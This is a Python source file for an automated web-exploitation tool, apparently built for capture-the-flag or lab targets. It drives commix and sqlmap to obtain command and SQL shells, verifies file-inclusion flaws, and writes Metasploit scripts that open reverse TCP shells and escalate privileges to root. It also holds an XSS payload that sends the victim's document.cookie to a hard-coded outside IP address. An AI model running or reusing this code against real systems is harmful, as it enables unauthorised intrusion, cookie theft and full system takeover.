import re
import sys
import pexpect
import time
import requests
import util
import random
import json

def cmd_injection(issue):
    cmd = ["commix", "--url"]

    url = issue["vector"]["action"]
    cookie_string = issue["cookie_string"]
    method = issue["vector"]["method"]
    shell = "false"
    shell_user = "none"
    args = issue["vector"]["default_inputs"]
    affected_arg = issue['vector']["affected_input_name"]
    ip = util.get_ip(url)
    next_state = "initialization"
    data = ""
    for k, v in args.items():
        if k == affected_arg:
            data += f"{k}=INJECT_HERE&"
        else:
            data += f"{k}={v}&"
    data = data[:-1]

    if method == "post":
        cmd.append(url)
        cmd.append("--data")
        cmd.append(f"'{data}'")
    elif method == "get":
        target = url+"?"+data
        cmd.append({target})
    if cookie_string:
        cmd.append("--cookie")
        cmd.append(f"'{cookie_string}'")
    cmd_args = cmd[1:]
    # print(cmd_args)
    commix_cmd = "python3 commix/commix.py"
    for i in cmd_args:
        commix_cmd += f" {i}"
    cmx = pexpect.spawn(commix_cmd, encoding='utf-8')

    cmx.logfile = sys.stdout
    index = cmx.expect(["Do you want to resume", "Pseudo-Terminal", "302 redirection", pexpect.EOF, pexpect.TIMEOUT], timeout=200)
    if index == 0:
        cmx.sendline("Y")
        cmx.expect("Pseudo-Terminal")
        cmx.sendline("Y")
        cmx.expect("(os_shell)")
        cmx.sendline("whoami")
        cmx.readline()
        cmx.readline()
        shell_user=cmx.readline()
        shell_user = util.ansi_escape(shell_user).replace("\r\n", "")
        cmx.sendline("quit")
        cmx.close()
        shell = "true"
        print(f"\n[*] ======== Web shell is successfully generated, the current user is {shell_user}")
        if shell_user == "root":
            next_state = "root"
        else:
            next_state = "basic"
    elif index == 1:
        cmx.sendline("Y")
        cmx.expect("(os_shell)")
        cmx.sendline("whoami")
        cmx.readline()
        cmx.readline()
        shell_user=cmx.readline()
        shell_user = util.ansi_escape(shell_user).replace("\r\n", "")
        cmx.sendline("quit")
        cmx.close()
        shell = "true"
        print(f"\n[*] ======== Web shell is successfully generated, the current user is {shell_user}")
        if shell_user == "root":
            next_state = "root"
        else:
            next_state = "basic"
    elif index == 2:
        print(f"\n[*] ======== Cookie is wrong")
        cmx.close()
    elif index == 3:
        print(f"\n[*] ======== Failed to generate shell")
        cmx.close()
    else:
        print(f"\n[*] ======== Timeout, failed to generate shell")
        cmx.close()

    report_issue = {}
    # save in report
    report_issue["url"] = url
    cookie = {}
    report_issue["name"] = issue["name"]
    report_issue["cwe"] = issue["cwe"]
    if cookie_string:
        for line in cookie_string.split(';'):
            name, value = line.strip().split("=", 1)
            cookie[name] = value
    report_issue["cookie"] = cookie
    report_issue["shell"] = shell
    report_issue["shell_user"] = shell_user
    report_issue["vector"] = {}
    report_issue["vector"]["method"] = method
    report_issue["vector"]["affected_arg"] = affected_arg
    report_issue["vector"]["args"] = args
    report_issue["vector"]["commix_cmd"] = commix_cmd
    report_issue["state"] = "exploit"
    report_issue["next_state"] = next_state
    return report_issue


def sql_injection(issue):

    url = issue["vector"]["action"]
    cookie_string = issue["cookie_string"]
    method = issue["vector"]["method"]
    shell = "false"
    shell_user = "none"
    args = issue["vector"]["default_inputs"]
    affected_arg = issue['vector']["affected_input_name"]
    ip = util.get_ip(url)
    next_state = "initialization"
    data = ""
    for k, v in args.items():
        if k == affected_arg:
            data += f"{k}=1&"
        else:
            data += f"{k}={v}&"
    data = data[:-1]

    cmd = ["--url"]
    if method == "post":
        cmd.append(f'"{url}"')
        cmd.append("--data")
        cmd.append(f'"{data}"')
    elif method == "get":
        target = url+"?"+data
        cmd.append(f'"{target}"')
    cmd.append("-p")
    cmd.append(affected_arg)
    if cookie_string:
        cmd.append("--cookie")
        cmd.append(f'"{cookie_string}"')
    cmd.append("--sql-shell")
    cmd_args = cmd
    print(cmd)
    sql = pexpect.spawn("sqlmap", cmd_args, encoding='utf-8')
    sql.logfile = sys.stdout
    while True:
        index = sql.expect_exact(["[Y/n]", "[y/N]", "sql-shell", "302 redirect",pexpect.EOF, pexpect.TIMEOUT], timeout=100)
        if index == 0:
            sql.sendline("Y")
        elif index == 1:
            sql.sendline("N")
        elif index == 2:
            shell = "true"
            shell_user = "sql"
            break
        elif index == 3:
            shell = "wrong_cookie"
            break
        else:
            break
    sql.close()
    if shell == "true":
        print(f"\n[*] ======== SQL shell is successfully generated, the current user is {shell_user}")
    elif shell == "wrong_cookie":
        print(f"\n[*] ======== Cookie is wrong")
    else:
        print(f"\n[*] ======== Failed to generate shell")
    next_state = "sql"
    report_issue = {}
    # save in report
    report_issue["name"] = issue["name"]
    report_issue["cwe"] = issue["cwe"]
    report_issue["name"] = issue["name"]
    report_issue["cwe"] = issue["cwe"]
    report_issue["url"] = url
    cookie = {}
    if cookie_string:
        for line in cookie_string.split(';'):
            name, value = line.strip().split("=", 1)
            cookie[name] = value
    report_issue["cookie"] = cookie
    report_issue["shell"] = shell
    report_issue["shell_user"] = shell_user
    report_issue["vector"] = {}
    report_issue["vector"]["method"] = method
    report_issue["vector"]["affected_arg"] = affected_arg
    report_issue["vector"]["args"] = args
    sqlmap_cmd = "sqlmap"
    for i in cmd_args:
        sqlmap_cmd += f" {i}"
    print(sqlmap_cmd)
    report_issue["vector"]["sqlmap_cmd"] = sqlmap_cmd
    report_issue["state"] = "exploit"
    report_issue["next_state"] = next_state

    return report_issue

def xss(issue):
    # verify vul
    proxies = {"http": "http://127.0.0.1:5555", "https": "https://127.0.0.1:5555", }

    random.seed(time.time())
    xss_seed = str(random.randint(0, 10000))
    payload = r'''</tEXtArEa>'"><img src=# style=display:none onerror=this.src='http://152.67.111.213/CTF/cookies.php?cookie='+document.cookie//>'''
    # proof = fr'''</tEXtArEa>'"><img src=# style=display:none onerror=this.src='{xss_seed}'//>'''
    proof = f"<img sRC={xss_seed}>"
    url = issue["vector"]["action"]
    cookie_string = issue["cookie_string"]
    method = issue["vector"]["method"]
    verified = "false"
    next_state = "initialization"

    cookie = {}
    if cookie_string:
        for line in cookie_string.split(';'):
            name, value = line.strip().split("=", 1)
            cookie[name] = value

    if "proof" in issue.keys():
        seed = issue["vector"]["seed"].replace(issue["proof"],"")+proof
    else:
        seed = proof
    args = issue["vector"]["default_inputs"]
    verified_args = args.copy()
    affected_arg = issue['vector']["affected_input_name"]
    verified_args[affected_arg] = f"1{seed}"

    if method == "post":
        r = requests.post(url, verified_args, cookies=cookie)
    elif method == "get":
        r = requests.get(url, verified_args, cookies=cookie)
    if proof in r.text:
        verified = "true"

    report_issue = {}
    # save in report
    report_issue["name"] = issue["name"]
    report_issue["cwe"] = issue["cwe"]
    report_issue["url"] = url
    report_issue["cookie"] = cookie
    report_issue["verified"] = verified
    report_issue["vector"] = {}
    report_issue["vector"]["method"] = method
    report_issue["vector"]["affected_arg"] = affected_arg
    report_issue["vector"]["args"] = args
    report_issue["vector"]["verified_args"] = verified_args
    report_issue["vector"]["seed"] = seed
    report_issue["vector"]["proof"] = proof
    report_issue["vector"]["payload"] = payload
    report_issue["state"] = "exploit"
    report_issue["next_state"] = next_state
    return report_issue

def LFI_Path(issue):

    url = issue["vector"]["action"]
    method = issue["vector"]["method"]
    affected_arg = issue['vector']["affected_input_name"]
    verified = "false"
    next_state = "initialization"
    cookie = {}
    for line in issue["cookie_string"].split(';'):
        name, value = line.strip().split("=", 1)
        cookie[name] = value
    seed = issue["vector"]["seed"]
    args = issue["vector"]["default_inputs"]
    verified_args = issue["vector"]["inputs"]
    proof = issue["proof"]

    if method == "post":
        r = requests.post(url, verified_args, cookies=cookie)
    elif method == "get":
        r = requests.get(url, verified_args, cookies=cookie)
    if proof in r.text:
        verified = "true"

    report_issue = {}
    # save in report
    report_issue["name"] = issue["name"]
    report_issue["cwe"] = issue["cwe"]
    report_issue["url"] = url
    report_issue["cookie"] = cookie
    report_issue["verified"] = verified
    report_issue["vector"] = {}
    report_issue["vector"]["method"] = method
    report_issue["vector"]["affected_arg"] = affected_arg
    report_issue["vector"]["args"] = args
    report_issue["vector"]["verified_args"] = verified_args
    report_issue["vector"]["seed"] = seed
    report_issue["vector"]["proof"] = proof
    report_issue["state"] = "exploit"
    report_issue["next_state"] = next_state
    return report_issue


def RFI(issue):
    url = issue["vector"]["action"]
    cookie_string = issue["cookie_string"]
    method = issue["vector"]["method"]
    shell = "false"
    shell_user = "none"
    args = issue["vector"]["default_inputs"]
    affected_arg = issue['vector']["affected_input_name"]
    ip = util.get_ip(url)
    args_string = ""
    for k, v in args.items():
        if k == affected_arg:
            args_string += f"{k}=XXpathXX&"
        else:
            args_string += f"{k}={v}&"
    args_string = args_string[:-1]
    next_state = "initialization"
    random.seed(time.time())
    rfi_seed = str(random.randint(0, 10000))

    path = util.get_path(url)
    with open(f'./msfScript/{rfi_seed}.rc','w+') as f:
        f.write("use exploit/unix/webapp/php_include\n")
        f.write(f"set rhost {ip}\n")
        if cookie_string:
            f.write(f'set headers "Cookie:{cookie_string}"\n')
        f.write(f"set phpuri {path}?{args_string}\n")
        f.write(f"set payloads generic/shell_reverse_tcp\n")
        f.write(f"run")

    rfi_cmd = pexpect.spawn(f"msfconsole -q -r ./msfScript/{rfi_seed}.rc", encoding='utf-8')
    rfi_cmd.logfile = sys.stdout
    index = rfi_cmd.expect(["session 1 opened", pexpect.EOF, pexpect.TIMEOUT])
    if index == 0:
        rfi_cmd.sendline("whoami")
        rfi_cmd.readline()
        rfi_cmd.readline()
        rfi_cmd.readline()
        shell = "true"
        shell_user = rfi_cmd.readline()
        shell_user = util.ansi_escape(shell_user).replace("\r\n", "")
        print(f"\n[*] ======== Shell is successfully generated, the current user is {shell_user}")
        if shell_user == "root":
            next_state = "root"
        else:
            next_state = "basic"
    else:
        print(f"\n[*] ======== Failed to generate shell")
    rfi_cmd.close()

    report_issue = {}
    # save in report
    report_issue["name"] = issue["name"]
    report_issue["cwe"] = issue["cwe"]
    report_issue["url"] = url
    cookie = {}
    if cookie_string:
        for line in cookie_string.split(';'):
            name, value = line.strip().split("=", 1)
            cookie[name] = value
    report_issue["cookie"] = cookie
    report_issue["shell"] = shell
    report_issue["shell_user"] = shell_user
    report_issue["msf_script"] = f"{rfi_seed}.rc"
    report_issue["vector"] = {}
    report_issue["vector"]["affected_arg"] = affected_arg
    report_issue["vector"]["args"] = args
    report_issue["state"] = "exploit"
    report_issue["next_state"] = next_state
    return report_issue

def CSRF(issue, report):
    next_state = "initialization"
    url = issue["vector"]["action"]
    method = issue["vector"]["method"]
    with open(f"./Report/{report}", "r") as r:
        data = json.load(r)
    affected_path = []
    for k, v in data.items():
        if "Initial exploit" in v.keys():
            if v["Initial exploit"]["url"] == url and v["Initial exploit"]["vector"]["method"] == method:
                affected_path.append(k)
        else:
            if v["url"] == url and v["vector"]["method"] == method:
                affected_path.append(k)
    report_issue = {}
    report_issue["name"] = issue["name"]
    report_issue["cwe"] = issue["cwe"]
    report_issue["url"] = url
    report_issue["method"] = method
    report_issue["affected_path"] = affected_path
    report_issue["state"] = "exploit"
    report_issue["next_state"] = next_state
    return report_issue

def pe_cmd(step_one, lhost="192.168.1.111"):
    success = "false"
    module_regex = r"exploit.+(?=:)"
    uid_regex = r"uid=.+?(?=,)"
    exploits = {}
    effective_exploit = ""
    next_state = "initialization"
    msf_process = pexpect.spawn(f"msfconsole -q", encoding='utf-8')
    msf_process.logfile = sys.stdout

    random.seed(time.time())
    seed = str(random.randint(0, 10000))
    cmx_seed = str(random.randint(0, 10000))
    with open(f'./msfScript/{seed}.rc', 'w+') as f:
        f.write("use multi/handler\n")
        f.write(f"set lhost {lhost}\n")
        f.write(f"set lport 4444\n")
        f.write(f"run -z\n")
    cmx_cmd = { 0 : step_one['vector']['commix_cmd']}
    msf_process = pexpect.spawn(f"msfconsole -q -r ./msfScript/{seed}.rc", encoding='utf-8')
    time.sleep(10)
    commix_process = pexpect.spawn(
        f"{cmx_cmd[0]}",
        encoding='utf-8')
    commix_process.logfile = sys.stdout
    index = commix_process.expect(
        ["Do you want to resume", "Pseudo-Terminal", "302 redirection", pexpect.EOF, pexpect.TIMEOUT],
        timeout=200)
    if index == 0:
        commix_process.sendline("Y")
        commix_process.expect("Pseudo-Terminal")
        commix_process.sendline("Y")
        commix_process.expect("(os_shell)")
        commix_process.sendline("reverse_tcp")
        commix_process.expect("(reverse_tcp)")
        commix_process.sendline(f"set LHOST {lhost}")
        commix_process.expect("(reverse_tcp)")
        commix_process.sendline(f"set LPORT 4444")
        commix_process.expect("(reverse_tcp)")
        commix_process.sendline(f"1")
        commix_process.expect("(reverse_tcp_netcat)")
        commix_process.sendline(f"1")
        commix_process.expect_exact("[y/N]")
        commix_process.sendline(f"y")
        cmx_cmd[1] = "reverse_tcp"
        cmx_cmd[2] = f"set LHOST {lhost}"
        cmx_cmd[3] = f"set LPORT 4444"
        cmx_cmd[4] = f"1"
        cmx_cmd[5] = f"1"
        cmx_cmd[6] = f"y"
    elif index == 1:
        commix_process.sendline("Y")
        commix_process.expect("(os_shell)")
        commix_process.sendline("reverse_tcp")
        commix_process.expect("(reverse_tcp)")
        commix_process.sendline(f"set LHOST {lhost}")
        commix_process.expect("(reverse_tcp)")
        commix_process.sendline(f"set LPORT 4444")
        commix_process.expect("(reverse_tcp)")
        commix_process.sendline(f"1")
        commix_process.expect("(reverse_tcp_netcat)")
        commix_process.sendline(f"1")
        commix_process.expect_exact("[y/N]")
        commix_process.sendline(f"y")
        with open(f'./msfScript/{cmx_seed}.txt', 'w+') as f:
            f.write(f"reverse_tcp\n"
                    f"set LHOST {lhost}"
                    f"set LPORT 4444"
                    f"1"
                    f"1"
                    f"y")
    elif index == 2:
        print(f"\n[-] ======== Cookie is wrong")
        commix_process.close()
    elif index == 3:
        print(f"\n[-] ======== Failed to generate shell")
        commix_process.close()
    else:
        print(f"\n[-] ======== Timeout, failed to generate shell")
        commix_process.close()

    msf_process.logfile = sys.stdout
    index = msf_process.expect(["Command shell session 1 opened", pexpect.EOF, pexpect.TIMEOUT], timeout=200)
    if index == 0:
        msf_process.expect("msf5.*>")
        msf_process.sendline("sessions -u 1")
        index2 = msf_process.expect(["Meterpreter session 2 opened", pexpect.TIMEOUT], timeout=50)
        if index2 == 0:
            msf_process.expect("msf5.*>")
            msf_process.sendline("use post/multi/recon/local_exploit_suggester")
            msf_process.expect("msf5.*>")
            msf_process.sendline("set session 2")
            msf_process.expect("msf5.*>")
            msf_process.sendline("run")
            msf_process.expect("msf5.*>", timeout=100)
            string = msf_process.before
            matches = re.finditer(module_regex, string, re.MULTILINE)
            for matchNum, match in enumerate(matches, start=0):
                exploits[matchNum] = match.group()
            if exploits != {}:
                for v in exploits.values():
                    msf_process.sendline(f"use {v}")
                    msf_process.expect("msf5.*>")
                    msf_process.sendline("set session 2")
                    msf_process.expect("msf5.*>")
                    msf_process.sendline("set payload linux/x86/meterpreter/reverse_tcp")
                    msf_process.expect("msf5.*>")
                    msf_process.sendline(f"set lhost {lhost}")
                    msf_process.expect("msf5.*>")
                    msf_process.sendline("set lport 5678")
                    msf_process.expect("msf5.*>")
                    msf_process.sendline("run")
                    peindex = msf_process.expect(
                        ["meterpreter.*>", "\[-\]", "Exploit completed, but no session was created", pexpect.EOF,
                         pexpect.TIMEOUT], timeout=50)
                    if peindex == 0:
                        msf_process.sendline("getuid")
                        msf_process.expect("meterpreter.*>")
                        uidinfo = msf_process.before
                        matches = re.findall(uid_regex, uidinfo)
                        uid = matches[0]
                        if uid == "uid=0":
                            success = "true"
                            msf_process.sendline("exit")
                            msf_process.expect("msf5.*>")
                            msf_process.sendline("sessions -K")
                            print(f"\n[*] ======== Get Root!")
                            effective_exploit = v
                            next_state = "root"
                            with open(f'./msfScript/{seed}.rc', 'a') as f:
                                f.write(f"\nuse post/multi/recon/local_exploit_suggester\n"
                                        f"run\n"
                                        f"use {v}\n"
                                        f"set session 2\n"
                                        f"set payload linux/x86/meterpreter/reverse_tcp\n"
                                        f"set lport 5678\n"
                                        f"run\n")
                            break
                        else:
                            msf_process.sendline("exit")
                            continue
                    else:
                        continue
            else:
                msf_process.sendline("sessions -K")
                print(f"\n[-] ======== Can't find vulnerability to privilege escalation")
        else:
            msf_process.expect("msf5.*>")
            msf_process.sendline("sessions -K")
            print(f"\n[-] ======== Failed to upgrade shell")
    else:
        print(f"\n[-] ======== Failed to generate shell")
    if success == "false":
        print(f"\n[-] ======== Failed to privilege escalation")

    commix_process.close()
    msf_process.close()

    pe = {}
    pe["tools"] = ["msfconsole", "commix"]
    pe["exploits"] = exploits
    pe["success"] = success
    pe["effective_exploit"] = effective_exploit
    pe["msf_script"] = f"{seed}.rc"
    pe["commix_commands"] = cmx_cmd
    pe["state"] = "basic"
    pe["next_state"] = next_state
    return {"Initial exploit" : step_one,
            "Privilege escalation" : pe}

def pe_rfi(step_one, lhost="192.168.1.111"):
    success = "false"
    effective_exploit = ""
    module_regex = r"exploit.+(?=:)"
    uid_regex = r"uid=.+?(?=,)"
    exploits = {}
    next_state = "initialization"
    msf_process = pexpect.spawn(f"msfconsole -q", encoding='utf-8')
    msf_process.logfile = sys.stdout

    random.seed(time.time())
    seed = str(random.randint(0, 10000))
    with open(f'./msfScript/{step_one["msf_script"]}', 'r') as r:
        initial = r.read()
    initial = initial.replace("run", "run -z")

    with open(f'./msfScript/{seed}.rc', 'w+') as f:
        f.write(initial)

    msf_process = pexpect.spawn(f"msfconsole -q -r ./msfScript/{seed}.rc", encoding='utf-8')
    msf_process.logfile = sys.stdout
    index = msf_process.expect(["session 1 opened", pexpect.EOF, pexpect.TIMEOUT], timeout=200)
    if index == 0:
        msf_process.expect("msf5.*>")
        msf_process.sendline("use post/multi/recon/local_exploit_suggester")
        msf_process.expect("msf5.*>")
        msf_process.sendline("set session 1")
        msf_process.expect("msf5.*>")
        msf_process.sendline("run")
        msf_process.expect("msf5.*>", timeout=100)
        string = msf_process.before
        matches = re.finditer(module_regex, string, re.MULTILINE)
        for matchNum, match in enumerate(matches, start=0):
            exploits[matchNum] = match.group()
        if exploits != {}:
            for v in exploits.values():
                msf_process.sendline(f"use {v}")
                msf_process.expect("msf5.*>")
                msf_process.sendline("set session 2")
                msf_process.expect("msf5.*>")
                msf_process.sendline("set payload linux/x86/meterpreter/reverse_tcp")
                msf_process.expect("msf5.*>")
                msf_process.sendline(f"set lhost {lhost}")
                msf_process.expect("msf5.*>")
                msf_process.sendline("set lport 5678")
                msf_process.expect("msf5.*>")
                msf_process.sendline("run")
                peindex = msf_process.expect(
                    ["meterpreter.*>", "\[-\]", "Exploit completed, but no session was created", pexpect.EOF,
                     pexpect.TIMEOUT], timeout=50)
                if peindex == 0:
                    msf_process.sendline("getuid")
                    msf_process.expect("meterpreter.*>")
                    uidinfo = msf_process.before
                    matches = re.findall(uid_regex, uidinfo)
                    uid = matches[0]
                    if uid == "uid=0":
                        success = "true"
                        msf_process.sendline("exit")
                        msf_process.expect("msf5.*>")
                        msf_process.sendline("sessions -K")
                        print(f"\n[*] ======== Get Root!")
                        next_state = "root"
                        effective_exploit = v
                        with open(f'./msfScript/{seed}.rc', 'a') as f:
                            f.write(f"\nuse post/multi/recon/local_exploit_suggester\n"
                                    f"run\n"
                                    f"use {v}\n"
                                    f"set session 2\n"
                                    f"set payload linux/x86/meterpreter/reverse_tcp\n"
                                    f"set lport 5678\n"
                                    f"run\n")
                        break
                    else:
                        msf_process.sendline("exit")
                        continue
                else:
                    continue
        else:
            msf_process.sendline("sessions -K")
            print(f"\n[-] ======== Can't find vulnerability to privilege escalation")
    else:
        print(f"\n[-] ======== Failed to generate shell")
    if success == "false":
        print(f"\n[-] ======== Failed to privilege escalation")
    msf_process.close()

    pe = {}
    pe["tools"] = ["msfconsole"]
    pe["exploits"] = exploits
    pe["success"] = success
    pe["effective_exploit"] = effective_exploit
    pe["msf_script"] = f"{seed}.rc"
    pe["state"] = "basic"
    pe["next_state"] = next_state
    return {"Initial exploit" : step_one,
            "Privilege escalation" : pe}